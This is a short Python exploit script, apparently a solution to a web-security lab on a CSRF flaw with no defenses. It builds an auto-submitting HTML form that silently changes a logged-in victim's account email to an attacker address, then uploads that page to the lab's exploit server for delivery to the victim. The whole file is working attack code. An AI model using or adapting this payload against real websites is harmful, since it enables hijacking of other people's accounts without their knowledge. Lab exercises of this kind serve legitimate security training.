#!/usr/bin/env python3
# https://github.com/wvverez
# CSRF vulnerability with no defenses

import requests, sys

if len(sys.argv) != 3:
    print(f"[+] Uso: {sys.argv[0]} <url_lab> <url_exploit_server>")
    sys.exit(1)

lab = sys.argv[1].rstrip('/')
exploit_url = sys.argv[2].rstrip('/')

html = f'''<form method="POST" action="{lab}/my-account/change-email"><input type="hidden" name="email" value="pwned@attacker.net"></form><script>document.forms[0].submit();</script>'''

data = {"urlIsHttps": "on", "responseFile": "/exploit", "responseHead": "HTTP/1.1 200 OK\nContent-Type: text/html; charset=utf-8", "responseBody": html, "formAction": "DELIVER_TO_VICTIM"}
requests.post(exploit_url, data=data)
print(">>> [+] Pwned!")
